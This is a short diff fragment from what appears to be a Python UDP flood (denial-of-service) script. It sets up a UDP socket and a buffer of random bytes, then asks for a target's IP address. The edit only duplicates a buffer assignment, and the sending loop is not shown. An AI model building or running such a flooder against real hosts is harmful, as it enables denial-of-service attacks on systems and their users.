@@ -10,7 +10,8 @@ N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(666)
-random = random._urandom(666)
+bytes = random._urandom(666)
+bytes = random._urandom(666)
 
 os.system("clear")
 ip = input("[+] Target's IP : ")
